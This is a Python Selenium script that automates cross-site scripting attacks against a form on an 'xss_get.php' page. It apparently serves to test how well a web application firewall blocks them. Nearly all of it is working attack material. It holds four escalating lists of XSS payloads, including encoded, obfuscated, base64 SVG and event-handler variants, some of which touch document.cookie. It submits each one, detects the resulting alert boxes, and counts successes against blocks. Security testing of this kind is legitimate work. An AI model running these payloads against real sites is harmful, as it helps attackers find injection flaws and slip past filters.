from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException


def execute(driver, target_url):
    # Start to attack
    implement_attack(driver, target_url)


def implement_attack(driver, target_url):
    print(f"[+] Running Cross Site Scripting [XSS] Attacks")
    xss_level_1 = [
        """<img src="" onerror="alert('XSS')">""",
        """<IMG SRC=# onerror="alert('XSS')">""",
        """<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>""",
        """<A HREF="http://google.com/">XSS</A>"""
    ]
    xss_level_2 = [
        """\<a onmouseover="alert(document.cookie)" id="xss"\>XSS\</a\> """,
        """<IFRAME SRC="javascript:alert('XSS');" id="xss"></IFRAME>""",
        """<IFRAME SRC=# onmouseover="alert(document.cookie)" id="xss"></IFRAME>""",
        """<A HREF="http://172.217.171.206/">XSS</A>""",
        """<A HREF="http://2899946446/">XSS</A>""",
        """<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>"""
    ]
    xss_level_3 = [
        """<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>""",
        """<img src=&#0000106 onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041" id="xss">""",
        """<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))" id="xss"></img>""",
        """<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always" id="xss"></EMBED>"""
    ]
    xss_level_4 = [
        """<Img src = x onerror = "javascript: window.onerror = alert; throw 'XSS'" id="xss">""",
        r"""<img src="x:gif" onerror="window['al\u0065rt']('xss')" id="xss"></img>""",
        """<iframe src=javascript&colon;alert&lpar;document&period;location&rpar; id="xss">""",
        r"""<form><a href="javascript:\u0061lert(1)" id="xss">X""",
        """</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)' id="xss">""",
        """<img src="/" =_=" title="onerror='prompt(1)'" id="xss">""",
        """<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1) id="xss">ClickMe""",
        """<form><button formaction=javascript&colon;alert(1) id="xss">CLICKME""",
        """<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E" id="xss"></iframe>"""
    ]

    all_xss_levels = [xss_level_1, xss_level_2, xss_level_3, xss_level_4]
    lvl_counter = 1
    blocked_by_waf_counter = 0
    results = {}
    attack_url_page = "xss_get.php"

    for lvl in all_xss_levels:
        success_counter = 0

        for payload in lvl:
            driver.get(target_url + attack_url_page)
            driver.find_element_by_id("firstname").send_keys(payload)
            driver.find_element_by_id("lastname").send_keys("a", Keys.RETURN)

            # Check for 'alert' box
            try:
                WebDriverWait(driver, 1).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert.accept()
                success_counter += 1
            except TimeoutException:
                # look for any element with id="xss", click it and check for 'alert' box
                try:
                    driver.find_element_by_id("xss").click()
                    WebDriverWait(driver, 5).until(EC.alert_is_present())
                    alert = driver.switch_to.alert
                    alert.accept()
                    success_counter += 1
                except NoSuchElementException:
                    try:
                        # Catch WAF Blocking page
                        waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
                        if "403 Forbidden" == waf_block_message:
                            blocked_by_waf_counter += 1
                    except NoSuchElementException:
                        pass

        print(f"[+] [Level {str(lvl_counter)}] Successful Attacks:", success_counter)
        results["lvl " + str(lvl_counter)] = success_counter
        lvl_counter += 1

    sum = 0
    for res in results.values(): sum += res
    print(f"\n[!] ~~~Cross Site Scripting [XSS] Results~~~ [!]")
    print(f"[+] Total Successful Attacks:", sum)
    print(f"[+] Total Blocked By WAF:", blocked_by_waf_counter)
    print(f"[+] Total Failed Attacks:", len(xss_level_1+xss_level_2+xss_level_3+xss_level_4) - blocked_by_waf_counter - sum)

